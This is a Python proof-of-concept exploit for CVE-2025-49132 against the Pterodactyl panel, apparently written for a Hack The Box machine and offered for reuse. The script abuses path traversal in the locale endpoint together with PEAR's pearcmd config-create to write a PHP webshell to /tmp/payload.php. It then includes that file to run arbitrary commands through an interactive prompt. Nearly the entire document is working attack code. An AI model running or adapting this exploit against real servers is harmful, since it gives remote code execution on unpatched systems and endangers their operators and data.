"""
This is just a proof of concept of CVE-2025-49132 and the original author of this cve is 0xtensho
I tired my self to make the exploite easier and useful for reediting it 
"""

# importing modules
import subprocess
import os
import sys

paner=r"""
__________   __                          .___              __  .__          
\______   \_/  |_  ___________  ____   __| _/____    _____/  |_|  | ___.__. 
 |     ___/\   __\/ __ \_  __ \/  _ \ / __ |\__  \ _/ ___\   __\  |<   |  | 
 |    |     |  | \  ___/|  | \(  <_> ) /_/ | / __ \\  \___|  | |  |_\___  | 
 |____|     |__|  \___  >__|   \____/\____ |(____  /\___  >__| |____/ ____| 
                      \/                  \/     \/     \/          \/      
"""

class CVE_2025_49132():
    def __init__(self,host,pearpath):
        self.host = host
        self.pearpath = pearpath

    def __str__(self):
        return f"[!] host {self.ip} pearpath {self.pearpath}"

    def exploit(self,command):
        """main exploit function

        arguments:
            command: the command you will have to excute
        """
        #injecting your command
        subprocess.run(f"curl \"http://{self.host}/locales/locale.json?+config-create+/&locale=../../../../..{self.pearpath}&namespace=pearcmd&/<?=print('---DELMITER---');system('{command}');print('---DELMITER---');?>+/tmp/payload.php\"",capture_output=True,text=True,shell=True)
        # excuting the command
        output = subprocess.run(f"curl \"http://{self.host}/locales/locale.json?locale=../../../../../tmp&namespace=payload\"",capture_output=True,text=True,shell=True)
        resault = output.stdout.split("---DELMITER---")[1].strip()
        print(resault)


# if the file woring localy
if __name__ == "__main__":
    print(paner+"\n"+"="*100)
    while True:
        pterodactly = CVE_2025_49132("panel.pterodactyl.htb","/usr/share/php/PEAR")
        command = input(":~$ ")

        # adding interactive clear command
        if command == "clear":
            os.system("clear")
            print(paner+"\n"+"="*100)
        elif command == "exit":
            sys.exit(1)
        else:
            pterodactly.exploit(command)